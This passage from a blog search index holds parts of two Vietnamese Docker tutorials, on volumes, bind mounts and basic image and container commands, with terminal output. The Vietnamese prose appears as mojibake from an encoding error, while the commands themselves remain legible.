ƒë∆∞·ª£c √°nh x·∫° ·ªü ƒë√¢u tr√™n container.\ndocker run -it -v \u0026lt;thu/muc/tren/host\u0026gt;:\u0026lt;thu/muc/anh/xa/tren/container\u0026gt; \u0026lt;image id\u0026gt;\n1 2 3 4 5 6  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 28 minutes ago 170MB\rcentos latest 300e315adb2f 6 months ago 209MB\r‚ùØ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data a8\rroot@d4d24f24bbe6:/#\r  Ch√∫ng ta ti·∫øn h√†nh ki·ªÉm tra:\n1 2 3 4  root@d4d24f24bbe6:/# cd /home/shared_data/\rroot@d4d24f24bbe6:/home/shared_data# ls\rd.txt\rroot@d4d24f24bbe6:/home/shared_data#   Nh∆∞ v·∫≠y, d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c √°nh x·∫° v√† m·ªçi thao t√°c tr√™n d·ªØ li·ªáu ·ªü th∆∞ m·ª•c n√†y s·∫Ω ƒë∆∞·ª£c l∆∞u v√†o host.\nChia s·∫ª d·ªØ li·ªáu gi·ªØa c√°c container v·ªõi nhau Ch√∫ng ta t·∫°o l·∫°i m·ªôt container c√≥ t√™n l√† container1 √°nh x·∫° t·ªõi d·ªØ li·ªáu Desktop/docker/data, v√† t·∫°o m·ªôt container2 mu·ªën √°nh x·∫° t·ªõi d·ª± li·ªáu n√†y, thay v√¨ d√πng l·ªánh t·∫°o nh∆∞ container1, ta c√≥ th·ªÉ d√πng --volumes-from \u0026lt;container_name/id\u0026gt;\n1 2 3 4 5 6 7 8  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 36 minutes ago 170MB\rcentos latest 300e315adb2f 6 months ago 209MB\r‚ùØ docker run -it -v /home/edisc/Desktop/docker/data:/home/shared_data --name \u0026#34;container1\u0026#34; a8\rroot@b62e5d395369:/# % ‚ùØ docker run -it --name container2 --volumes-from container1 centos\r[root@e1103acb0525 /]#\r  Chia s·∫ª qua volume B√™n c·∫°nh vi·ªác chia s·∫ª d·ªØ li·ªáu b·∫±ng c√°ch t·∫°o c√°c file d·ªØ li·ªáu, docker c√≤n cho ph√©p ch√∫ng ta t·∫°o ra nh·ªØng ·ªï ƒëƒ©a, g√°n v√†o container v√† ƒë·ªÉ chia s·∫ª d·ªØ li·ªáu gi·ªØa ch√∫ng. C≈©ng nh∆∞ file, khi container x√≥a th√¨ nh·ªØng ·ªï ƒëƒ©a n√†y v·∫´n c√≤n t·ªìn t·∫°i cho ƒë·∫øn khi ch√∫ng ta c·ªë t√¨nh x√≥a n√≥.\nKi·ªÉm tra c√°c ·ªï ƒëƒ©a hi·ªán c√≥ ƒê·ªÉ ki·ªÉm tra c√°c ·ªï ƒëƒ©a hi·ªán c√≥, ta d√πng l·ªánh:\n1 2  ‚ùØ docker volume ls\rDRIVER VOLUME NAME\r  Hi·ªán t·∫°i tr√™n h·ªá th·ªëng kh√¥ng c√≥ ·ªï ƒëƒ©a n√†o.\nT·∫°o ·ªï ƒëƒ©a ƒê·ªÉ t·∫°o m·ªôt ·ªï ƒëƒ©a m·ªõi, ta d√πng l·ªánh: docker volume create NAMEDISK.\n1 2 3 4 5  ‚ùØ docker volume create D1\rD1\r‚ùØ docker volume ls\rDRIVER VOLUME NAME\rlocal D1\r  Ki·ªÉm tra th√¥ng tin ·ªï ƒëƒ©a ƒê·ªÉ ki·ªÉm tra th√¥ng tin ·ªï ƒëƒ©a ta d√πng l·ªánh docker volume inspect NAMEDISK.\n1 2 3 4 5 6 7 8 9 10 11 12  ‚ùØ docker volume inspect D1\r[\r{\r\u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:06:13+07:00\u0026#34;,\r\u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;,\r\u0026#34;Labels\u0026#34;: {},\r\u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/D1/_data\u0026#34;,\r\u0026#34;Name\u0026#34;: \u0026#34;D1\u0026#34;,\r\u0026#34;Options\u0026#34;: {},\r\u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;\r}\r]\r  X√≥a ·ªï ƒëƒ©a Khi kh√¥ng c√≥ nhu c·∫ßu s·ª≠ d·ª•ng, ta s·ª≠ d·ª•ng l·ªánh docker volume rm NAMEDISK.\n1 2 3 4 5 6 7 8 9  ‚ùØ docker volume ls\rDRIVER VOLUME NAME\rlocal D1\rlocal D2\r‚ùØ docker volume rm D1\rD1\r‚ùØ docker volume ls\rDRIVER VOLUME NAME\rlocal D2\r  G√°n ·ªï ƒëƒ©a volume v√†o container Ta s·ª≠ d·ª•ng c√∫ ph√°p:\ndocker run -it --mount source=DISK,target=pathContainer imageID\n1 2 3 4 5 6 7 8  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 About an hour ago 170MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r‚ùØ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest\rroot@524a1182f690:/# cd /home/disk2/\rroot@524a1182f690:/home/disk2#\r  Ta ti·∫øn h√†nh th√™m d·ªØ li·ªáu trong th∆∞ m·ª•c tr√™n, sau ƒë√≥ x√≥a container ƒëi, v√† th·∫•y, ·ªï ƒëƒ©a v·∫´n c√≤n.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 About an hour ago 170MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r‚ùØ docker run -it --mount source=D2,target=/home/disk2 ubuntu:latest\rroot@524a1182f690:/# cd /home/disk2/\rroot@524a1182f690:/home/disk2#\r‚ùØ docker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r524a1182f690 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About a minute ago Exited (0) 23 seconds ago cocky_mclaren\re1103acb0525 centos \u0026#34;/bin/bash\u0026#34; 19 minutes ago Exited (127) 11 minutes ago container2\rb62e5d395369 a8 \u0026#34;/bin/bash\u0026#34; 21 minutes ago Exited (0) 11 minutes ago container1\r‚ùØ docker rm 52\r52\r‚ùØ docker volume ls\rDRIVER VOLUME NAME\rlocal D2\r  V·∫≠y l√†m sao ƒë·ªÉ truy xu·∫•t d·ªØ li·ªáu hi·ªán c√≥ tr√™n D2 ho·∫∑c ki·ªÉm tra xem c√≥ d·ªØ li·ªáu tr√™n ƒë√≥ hay kh√¥ng? ƒê·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu ƒë√≥, ch√∫ng ta t·∫°o m·ªôt container kh√°c, mount t·ªõi D2 v√† ki·ªÉm tra.\n1 2 3 4 5  ‚ùØ docker run -it --mount source=D2,target=/home/disk3 ubuntu:latest\rroot@ca47e1855144:/# cd /home/disk3/\rroot@ca47e1855144:/home/disk3# ls\rdata.txt\rroot@ca47e1855144:/home/disk3#   D·ªØ li·ªáu do container tr∆∞·ªõc ƒë√£ t·∫°o v√† l∆∞u v√†o, d·ªØ li·ªáu n√†y v·∫´n c√≤n m·∫∑c d√π container ƒë√£ x√≥a ƒëi.\nT·∫°o ·ªï ƒëƒ©a √°nh x·∫° t·ªõi th∆∞ m·ª•c tr√™n m√°y host. C√∫ ph√°p:\ndocker create --opt device =pathHOST --opt type=noe --opt o=bind DISKNAME\n1 2 3 4 5 6  ‚ùØ docker volume create --opt device=/home/edisc/Desktop/docker/data --opt type=none --opt o=bind DISK1\rDISK1\r‚ùØ docker volume ls\rDRIVER VOLUME NAME\rlocal D2\rlocal DISK1\r  Th√¥ng tin ·ªï ƒëƒ©a c√≥ ƒë∆∞·ª£c nh∆∞ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ‚ùØ docker volume inspect DISK1\r[\r{\r\u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-06-08T10:27:56+07:00\u0026#34;,\r\u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;,\r\u0026#34;Labels\u0026#34;: {},\r\u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/DISK1/_data\u0026#34;,\r\u0026#34;Name\u0026#34;: \u0026#34;DISK1\u0026#34;,\r\u0026#34;Options\u0026#34;: {\r\u0026#34;device\u0026#34;: \u0026#34;/home/edisc/Desktop/docker/data\u0026#34;,\r\u0026#34;o\u0026#34;: \u0026#34;bind\u0026#34;,\r\u0026#34;type\u0026#34;: \u0026#34;none\u0026#34;\r},\r\u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;\r}\r]\r  ƒê·ªÉ ch·∫°y container v·ªõi tham s·ªë n√†y ta kh√¥ng s·ª≠ d·ª•ng t√πy ch·ªçn --mount m√† ta s·∫Ω s·ªß d·ª•ng t√πy ch·ªçn -v.\n1 2 3 4 5 6 7 8 9 10  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 About an hour ago 170MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r‚ùØ docker run -it -v DISK1:/home/disk4 ubuntu:latest\rroot@e94027a36d5b:/# cd /home/disk4/\rroot@e94027a36d5b:/home/disk4# ls\rc1.txt d.txt data_container2.txt\rroot@e94027a36d5b:/home/disk4#   V√†o th∆∞ m·ª•c v√† ki·ªÉm tra, ta v·∫´n th·∫•y n√≥ c√≥ c√°c d·ªØ li·ªáu ·ªü tr√™n m√°y host. V√† khi thao t√°c d·ªØ li·ªáu tr√™n n√†y, d·ªØ li·ªáu tr√™n m√°y host c≈©ng s·∫Ω ƒë∆∞·ª£c c·∫≠p nh√¢t.\nK·∫øt lu·∫≠n Trong b√†i h·ªçc n√†y, ch√∫ng ta ƒë√£ h·ªçc ƒë∆∞·ª£c t·ª´ anh XuanThuLabChanel nh·ªØng ki·∫øn th·ª©c nh∆∞ sau: C√°c l·ªánh Docker exec, l∆∞u container th√†nh image v·ªõi commit, xu·∫•t image ra file:\n docker exec: th·ª±c thi m·ªôt l·ªánh b√™n trong container ƒëang ch·∫°y t·ª´ host. docker commit: l∆∞u container th√†nh image docker save: l∆∞u image th√†nh file. docker load: chuy·ªÉn file th√†nh image.\nChia s·∫ª d·ªØ li·ªáu trong Docker, t·∫°o v√† qu·∫£n l√Ω ·ªï ƒëƒ©a docker volume: Chia s·∫ª d·ªØ li·ªáu qua t·ªáp:  Container v·ªõi host Gi·ªØa container v·ªõi nhau.   Chia s·∫ª d·ªØ li·ªáu qua ·ªï ƒëƒ©a disk: c√°c thao t√°c v·ªõi volume th√¥ng qua l·ªánh docker volume k√®m c√°c option t∆∞∆°ng ·ª©ng.\nK·∫øt th√∫c b√†i vi·∫øt n√†y, m·ªôt l·∫ßn n·ªØa em xin ch√¢n th√†nh g·ª≠i l·ªùi c·∫£m ∆°n ƒë·∫øn anh XuanThuLabChanel ƒë√£ l√†m nh·ªØng b√†i h·ªçc qu√Ω gi√° v√† b·ªï √≠ch n√†y.  ","description":"Ph·∫ßn n√†y ch√∫ng ta s·∫Ω t√¨m hi·ªÉu l·ªánh Docker exec, l∆∞u container th√†nh image v·ªõi commit, xu·∫•t image ra file; Chia s·∫ª d·ªØ li·ªáu trong Docker, t·∫°o v√† qu·∫£n l√Ω ·ªï ƒëƒ©a docker volume ","id":15,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P2)","uri":"https://minhlongmt183.github.io/posts/docker_p2/"},{"content":"To√†n b·ªô series n√†y ƒë∆∞·ª£c tham kh·∫£o t·ª´ hai ngu·ªìn ch√≠nh: XuanThuLabChanel v√† DockerDoc. Em xin ch√¢n th√†nh c·∫£m ∆°n s·ª± c·ªëng hi·∫øn c·ªßa c√°c t√°c gi·∫£ c·ªßa nh·ªØng k√™nh n√≥i tr√™n.‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è\r L√†m quen v·ªõi docker command line Khi l√†m vi·ªác v·ªõi docker, l·ªánh ch√∫ng ta hay d√πng ƒë√≥ ch√≠nh l√† docker. Sau l·ªánh docker s·∫Ω c√≥ nhi·ªÅu l·ªánh nh·ªè, ƒë·ªÉ xem danh s√°ch c√°c l·ªánh nh·ªè n√†y, ta g√µ\n1  $ docker   1  $ docker run -d -p 80:80 docker/getting-started\r  Trong ƒë√≥:\n -d: ch·∫°y container ·ªü ch·∫ø ƒë·ªô detached mode (·ªü background) -p 80:80: √°nh x·∫° c·ªïng 80 c·ªßa host v√†o c·ªïng 80 c·ªßa container. docker/getting-started: image s·ª≠ d·ª•ng  Docker images Li·ªát k√™ c√°c images 1 2 3 4 5 6  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rdebian latest 4a7a1f401734 3 weeks ago 114MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rdocker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB\rhello-world latest d1165f221234 3 months ago 13.3kB\r  ·ªû ƒë√¢y,\n REPOSITORY l√† t√™n c·ªßa image, TAG l√† phi√™n b·∫£n c·ªßa image, IMAGE ID l√† m·ªôt m√£ hash c·ªßa image, CREATED l√† th·ªùi gian ƒë∆∞·ª£c t·∫°o c·ªßa image, SIZE l√† k√≠ch th∆∞·ªõc c·ªßa image.\nC√°c images n√†y l·∫•y t·ª´ hub.docker.com. Ch√∫ng ta v√†o hub.docker.com ƒë·ªÉ t√¨m ki·∫øm image th√≠ch h·ª£p m√† m√¨nh mu·ªën t·∫£i. L∆∞u √Ω n·∫øu l·∫ßn ƒë·∫ßu b·∫°n v√†o trang n√†y, b·∫°n c·∫ßn ƒëƒÉng k√≠ m·ªôt t√†i kho·∫£n. Ngo√†i ra, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp tr√™n terminal v·ªõi l·ªánh:  1  docker search \u0026lt;keyword\u0026gt;\r  V√≠ d·ª•, ta mu·ªën t√¨m ki·∫øm c√°c images c·ªßa ubuntu\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  ‚ùØ docker search ubuntu\rNAME DESCRIPTION STARS OFFICIAL AUTOMATED\rubuntu Ubuntu is a Debian-based Linux operating sys‚Ä¶ 12337 [OK] dorowu/ubuntu-desktop-lxde-vnc Docker image to provide HTML5 VNC interface ‚Ä¶ 539 [OK]\rwebsphere-liberty WebSphere Liberty multi-architecture images ‚Ä¶ 273 [OK] rastasheep/ubuntu-sshd Dockerized SSH service, built on top of offi‚Ä¶ 253 [OK]\rconsol/ubuntu-xfce-vnc Ubuntu container with \u0026#34;headless\u0026#34; VNC session‚Ä¶ 241 [OK]\rubuntu-upstart Upstart is an event-based replacement for th‚Ä¶ 110 [OK] 1and1internet/ubuntu-16-nginx-php-phpmyadmin-mysql-5 ubuntu-16-nginx-php-phpmyadmin-mysql-5 50 [OK]\ropen-liberty Open Liberty multi-architecture images based‚Ä¶ 46 [OK] ubuntu-debootstrap debootstrap --variant=minbase --components=m‚Ä¶ 44 [OK] i386/ubuntu Ubuntu is a Debian-based Linux operating sys‚Ä¶ 25 nuagebec/ubuntu Simple always updated Ubuntu docker images w‚Ä¶ 24 [OK]\rsolita/ubuntu-systemd Ubuntu + systemd 24 [OK]\r1and1internet/ubuntu-16-apache-php-5.6 ubuntu-16-apache-php-5.6 14 [OK]\r1and1internet/ubuntu-16-apache-php-7.0 ubuntu-16-apache-php-7.0 13 [OK]\r1and1internet/ubuntu-16-nginx-php-phpmyadmin-mariadb-10 ubuntu-16-nginx-php-phpmyadmin-mariadb-10 11 [OK]\r1and1internet/ubuntu-16-nginx-php-5.6-wordpress-4 ubuntu-16-nginx-php-5.6-wordpress-4 9 [OK]\r1and1internet/ubuntu-16-nginx-php-5.6 ubuntu-16-nginx-php-5.6 8 [OK]\r1and1internet/ubuntu-16-apache-php-7.1 ubuntu-16-apache-php-7.1 7 [OK]\r1and1internet/ubuntu-16-nginx-php-7.0 ubuntu-16-nginx-php-7.0 4 [OK]\rpivotaldata/ubuntu A quick freshening-up of the base Ubuntu doc‚Ä¶ 4 pivotaldata/ubuntu16.04-build Ubuntu 16.04 image for GPDB compilation 2 pivotaldata/ubuntu-gpdb-dev Ubuntu images for GPDB development 1 smartentry/ubuntu ubuntu with smartentry 1 [OK]\r1and1internet/ubuntu-16-sshd ubuntu-16-sshd 1 [OK]\r1and1internet/ubuntu-16-php-7.1 ubuntu-16-php-7.1 1 [OK]\r  M·ª•c OFFICIAL cho bi·∫øt phi√™n b·∫£n n√†y l√† ch√≠nh ch·ªß. ƒê·ªÉ s·ª≠ d·ª•ng m·ªôt image n√†o ƒë√≥, ch√∫ng ta c·∫ßn ƒë·ªçc th√¥ng tin c·ªßa image tr√™n hub.docker v√† c√°c phi·ªÉn b·∫£n c·ªßa image n·∫±m ·ªü ph·∫ßn tag.\nT·∫£i image ƒê·ªÉ t·∫£i image, ta s·ª≠ d·ª•ng:\n1  docker pull image:tag\r  ·ªû ƒë√¢y, tag l√† phi√™n b·∫£n m√† ch√∫ng ta mu·ªën s·ª≠ d·ª•ng. N·∫øu ch√∫ng ta mu·ªën t·∫£i b·∫£n ubuntu 20.04 th√¨ c√¢u l·ªánh s·∫Ω l√†:\n1 2 3 4  ‚ùØ docker pull ubuntu:20.04\r20.04: Pulling from library/ubuntu\rDigest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d\rStatus: Downloaded newer image for ubuntu:20.04\r  Ch√∫ng ta ki·ªÉm tra l·∫°i ƒë·ªÉ x√°c nh·∫≠n docker ƒë√£ ƒë∆∞·ª£c t·∫£i b·∫±ng l·ªánh docker images\n1 2 3 4 5 6 7  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rdebian latest 4a7a1f401734 3 weeks ago 114MB\rubuntu 20.04 7e0aa2d69a15 6 weeks ago 72.7MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rdocker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB\rhello-world latest d1165f221234 3 months ago 13.3kB\r  Khi ch√∫ng ta kh√¥ng ƒë·ªÉ tag, m·∫∑c ƒë·ªãnh n√≥ xem nh∆∞ tag n√†y l√† latest v√† s·∫Ω t·∫£i b·∫£n m·ªõi nh·∫•t v·ªÅ, v√† khi ch√∫ng ta in ra c√°c images, nh·ªØng images n√†y s·∫Ω c√≥ tag l√† latest.\n1 2 3 4 5 6  ‚ùØ docker pull centos\rUsing default tag: latest\rlatest: Pulling from library/centos\r7a0437f04f83: Pull complete Digest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1\rStatus: Downloaded newer image for centos:latest\r  X√≥a Image ƒê·ªÉ x√≥a m·ªôt image kh√¥ng s·ª≠ d·ª•ng, ch√∫ng ta d√πng c√¢u l·ªánh:\n1  docker image rm \u0026lt;ten_image_muon_xoa:tag\u0026gt;\r  V√≠ d·ª•, t√¥i mu·ªën x√≥a image ubuntu:20.04, ta l√†m nh∆∞ sau:\n1 2  ‚ùØ docker image rm ubuntu:20.04\rUntagged: ubuntu:20.04\r  K·∫øt qu·∫£ sau khi x√≥a:\n1 2 3 4 5 6  ‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rdebian latest 4a7a1f401734 3 weeks ago 114MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rdocker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB\rhello-world latest d1165f221234 3 months ago 13.3kB\r  Ngo√†i ra, ch√∫ng ta c√≤n c√≥ th·ªÉ x√≥a b·∫±ng c√°ch d√πng IMAGE ID, v√≠ d·ª•, ta mu·ªën x√≥a image hello-world,\n1 2 3 4 5 6 7 8 9 10  ‚ùØ docker image rm d1165f221234\rUntagged: hello-world:latest\rUntagged: hello-world@sha256:5122f6204b6a3596e048758cabba3c46b1c937a46b5be6225b835d091b90e46c\rDeleted: sha256:d1165f2212346b2bab48cb01c1e39ee8ad1be46b87873d9ca7a4e434980a7726\rDeleted: sha256:f22b99068db93900abe17f7f5e09ec775c2826ecfe9db961fea68293744144bd\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rdebian latest 4a7a1f401734 3 weeks ago 114MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rdocker/getting-started latest 3ba8f2ff0727 2 months ago 27.9MB\r  Docker version Usage 1  $ docker version [OPTIONS]\r  Get the server version 1  $ docker version --format \u0026#39;{{.Server.Version}}\u0026#39;\r  Dump raw JSON data 1  $ docker version --format \u0026#39;{{json .}}\u0026#39;\r  Print the current context 1  $ docker version --format=\u0026#39;{{.Client.Context}}\u0026#39;\r  Docker run Image s·∫Ω ƒë∆∞∆°c ch·∫°y trong c√°c container, ƒë·ªÉ ch·∫°y ta th·ª±c hi·ªán c√¢u l·ªánh:\n Usage:  1  $ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]\r   C√≥ r·∫•t nhi·ªÅu tham s·ªë, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc ·ªü ƒë√¢y  V√≠ d·ª•: Ch·∫°y m·ªôt image 1  docker run -it \u0026lt;ten_image/image_id\u0026gt;\r  ·ªû ƒë√¢y, -it l√† vi·∫øt g·ªçn c·ªßa 2 options: -i (interactive) v√† -t (terminal) ch·ªâ ƒë·ªãnh t·∫°o ra container v√† c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi n√≥ tr·ª±c ti·∫øp tr√™n terminal. Gi·∫£ s·ª≠ ta ch·∫°y image ubuntu:latest.\n1 2  ‚ùØ docker run -it ubuntu:latest\rroot@b2d8e983bcef:/#   V·∫≠y l√† ch√∫ng ta ƒë√£ ch·∫°y image ubuntu:latest v√† ƒëang ·ªü container ubuntu, t√†i kho·∫£n root v·ªõi hostname l√† b2d8e983bcef. Ch√∫ng ta ki·ªÉm tra th√¥ng tin c·ªßa ubuntu n√†y.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@ff7140c65b73:/# cat /etc/*release\rDISTRIB_ID=Ubuntu\rDISTRIB_RELEASE=20.04\rDISTRIB_CODENAME=focal\rDISTRIB_DESCRIPTION=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34;\rNAME=\u0026#34;Ubuntu\u0026#34;\rVERSION=\u0026#34;20.04.2 LTS (Focal Fossa)\u0026#34;\rID=ubuntu\rID_LIKE=debian\rPRETTY_NAME=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34;\rVERSION_ID=\u0026#34;20.04\u0026#34;\rHOME_URL=\u0026#34;https://www.ubuntu.com/\u0026#34;\rSUPPORT_URL=\u0026#34;https://help.ubuntu.com/\u0026#34;\rBUG_REPORT_URL=\u0026#34;https://bugs.launchpad.net/ubuntu/\u0026#34;\rPRIVACY_POLICY_URL=\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026#34;\rVERSION_CODENAME=focal\rUBUNTU_CODENAME=focal\rroot@ff7140c65b73:/#   ƒê·ªÉ ki·ªÉm tra c√≥ nh·ªØng container n√†o ƒëang ch·∫°y tr√™n m√°y, ch√∫ng ta d√πng l·ªánh:\n1 2 3  ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 2 minutes unruffled_goldberg\r  K·∫øt qu·∫£ tr√™n cho th·∫•y, h·ªá th·ªëng ƒëang ch·∫°y m·ªôt container c√≥ id l√† ff7140c65b73 v√† ch·∫°y t·ª´ image ubuntu:latest, v·ªõi command /bin/bash.\nKhi ch√∫ng ta g√µ l·ªánh exit ƒë·ªÉ tho√°t kh·ªèi container, l·ªánh docker ps s·∫Ω kh√¥ng hi·ªÉn th·ªã container n√†o, tuy nhi√™n, l·ªánh docker ps -a s·∫Ω li·ªát k√™ t·∫•t c·∫£ c√°c container ƒëang hi·ªán c√≥ tr√™n m√°y k√®m theo tr·∫°ng th√°i c·ªßa n√≥.\n1 2 3 4  ‚ùØ docker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 5 seconds ago unruffled_goldberg\rb2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 11 minutes ago Exited (0) 11 minutes ago gallant_snyder\r  Tr·∫°ng th√°i Exited th·ªÉ hi·ªán container ƒë√£ b·ªã d·ª´ng, v√† ƒë·ªÉ kh·ªüi ƒë·ªông l·∫°i docker ƒë√£ d·ª´ng, ta d√πng l·ªánh docker start\n1 2 3 4 5 6 7 8 9  ‚ùØ docker start ff7140c65b73\rff7140c65b73\r‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 6 seconds unruffled_goldberg\r‚ùØ docker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 11 seconds unruffled_goldberg\rb2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 14 minutes ago Exited (0) 14 minutes ago gallant_snyder\r  ƒê·ªÉ v√†o l·∫°i h·ªá ƒëi·ªÅu h√†nh trong container, ta d√πng l·ªánh docker attach container_id, l∆∞u √Ω, id ch√∫ng ta kh√¥ng c·∫ßn ghi h·∫øt, ch·ªâ c·∫ßn ghi 2-3 ch·ªØ c√°i ƒë·∫ßu l√† ƒë∆∞·ª£c.\n1 2  ‚ùØ docker attach ff\rroot@ff7140c65b73:/#   ƒê·ªÉ tho√°t kh·ªèi container m√† kh√¥ng d·ª´ng n√≥, ta d√πng t·ªï h·ª£p ph√≠m ctrl + P, ctrl + Q. Khi ch√∫ng ta d√πng t·ªï h·ª£p n√†y, ta s·∫Ω c√≥ k·∫øt qu·∫£ sau:\n1 2  ‚ùØ docker attach ff\rroot@ff7140c65b73:/# read escape sequence\r  T·ª´ m√°y host, ƒë·ªÉ d·ª´ng container, ta d√πng l·ªánh docker stop \u0026lt;container_name/container_id\u0026gt;\n1 2 3 4 5 6 7  ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 26 minutes ago Up 14 minutes unruffled_goldberg\r‚ùØ docker stop unruffled_goldberg\runruffled_goldberg\r‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r  ƒê·∫∑t t√™n cho container 1 2  ‚ùØ docker run -it --name \u0026#34;centos_docker\u0026#34; -h centos1 centos:latest\r[root@centos1 /]#   V√≠ d·ª• tr√™n ch·∫°y container c√≥ t√™n l√† centos_docker s·ª≠ d·ª•ng image centos:latest.\n -it t·∫°o m·ªôt t∆∞∆°ng t√°c bash shell trong container. --name: ƒë·∫∑t t√™n cho container. -h: ƒë·∫∑t hostname cho container.\nCh√∫ng ta c√≥ th·ªÉ ki·ªÉm tra  1 2 3  ‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 3 seconds centos_docker\r  Capture container ID (\u0026ndash;cidfile) 1 2 3 4 5 6 7 8 9  ‚ùØ docker run --cidfile /tmp/docker_test.cid ubuntu echo \u0026#34;test\u0026#34;\rUnable to find image \u0026#39;ubuntu:latest\u0026#39; locally\rlatest: Pulling from library/ubuntu\r345e3491a907: Pull complete 57671312ef6f: Pull complete 5e9250ddb7d0: Pull complete Digest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d\rStatus: Downloaded newer image for ubuntu:latest\rtest\r   L·ªánh n√†y t·∫°o container v√† in test ra m√†n h√¨nh console. Flag cidfile y√™u c·∫ßu Docker t·∫°o m·ªôt file m·ªõi v√† vi·∫øt container ID v√†o n√≥. N·∫øu file ƒë√£ t·ªìn t·∫°i, Docker s·∫Ω tr·∫£ v·ªÅ error. Docker s·∫Ω ƒë√≥ng file khi docker run k·∫øt th√∫c.  Full container capabilities (\u0026ndash;privileged) 1 2 3 4  ‚ùØ docker run -t -i --rm ubuntu bash\rroot@bd1340e91d1e:/# mount -t tmpfs none /mnt\rmount: /mnt: permission denied.\rroot@bd1340e91d1e:/#    --rm t·ª± ƒë·ªông x√≥a container n·∫øu nh∆∞ n√≥ ƒë√£ t·ªìn t·∫°i. L·ªánh n√†y kh√¥ng ho·∫°t ƒë·ªông, v√¨ theo m·∫∑c ƒë·ªãnh, nh·ªØng c√¢u l·ªánh ƒëem l·∫°i kh·∫£ nƒÉng nguy hi·ªÉm t·ªõi kernel s·∫Ω b·ªã lo·∫°i b·ªè, bao g·ªìm cap_sys_admin (l·ªánh y√™u c·∫ßu mount filesystems). Tuy nhi√™n, flag --privileged s·∫Ω cho ph√©p ch√∫ng ta run:  1 2 3 4 5 6 7 8 9 10 11  ‚ùØ docker run -t -i --privileged ubuntu bash\rroot@a3c5921afbbc:/# mount -t tmpfs none /mnt\rroot@a3c5921afbbc:/# df -h\rFilesystem Size Used Avail Use% Mounted on\roverlay 110G 58G 46G 56% 